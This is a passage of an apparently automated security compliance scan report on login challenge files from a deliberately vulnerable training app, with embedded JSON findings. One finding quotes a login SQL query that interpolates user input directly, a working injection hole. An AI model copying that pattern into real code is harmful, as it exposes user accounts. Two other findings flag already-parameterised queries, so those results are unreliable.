"INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/loginBenderChallenge_1.ts`
**Scanned at**: 2026-10-11T16:33:51.938058+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 18 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 18
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: t...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🟠 High | [INJECT-M-001](https://verify.example-org.internal/?id=INJECT-M-001) | LDAP Injection Prevention |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 18, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/loginAdminChallenge_4_correct.ts`
**Scanned at**: 2026-10-11T16:33:52.411229+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/loginAdminChallenge_3.ts`
**Scanned at**: 2026-10-11T16:33:51.727903+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/loginAdminChallenge_2.ts`
**Scanned at**: 2026-10-11T16:33:52.286342+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
